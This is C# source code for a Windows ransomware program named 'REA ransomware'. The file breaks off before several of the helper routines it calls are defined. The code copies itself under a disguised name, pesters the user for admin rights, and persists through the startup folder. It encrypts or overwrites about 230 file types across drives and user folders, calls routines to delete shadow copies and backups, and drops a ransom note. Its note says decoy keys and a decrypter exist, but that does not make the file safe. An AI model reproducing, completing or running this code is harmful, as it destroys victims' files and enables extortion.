using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "encrypted_file";

	private static bool checkSpread = false;

	private static string spreadName = "surprise";

	private static bool checkCopyRoaming = true;

	private static string processName = "explorer.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = true;

	private static int sleepTextbox = 7;

	private static string base64Image = "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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "open_me.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[8] { "Your computer has been encrypted by the REA ransomware.", "Without the key, files cannot be returned.", "You are lucky the the key is easily findable, but there are a ton of decoys.", "goodluck.", "", "Kg8bno-i8ayt5-Lom4aE", "R8Iopl-7RhLba-Sb246F", "Dev's Note: Eventually, I will add more codes, and if you unwillingly got this ransom, the decrypter is here. | https://github.com/FloppaBoi001/REA-Malware |" };

	private static string[] validExtensions = new string[230]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d", "exe"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>oSceNTjzCfN5pgXGRXfhw81nUR6JBeEMch9s/vZVuwqDWM7e689DN7XF6ipLeA+o8vQFAQaw2iCGucKGlqx86QZC47umOtOP7LOTcKIkGfF39kFPeZN3dHXQSn9qCVuv7vQ2fX2x1Nn9v1bmeQ7EKFhqYLv71FPT+FSrD1o6iOU=</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

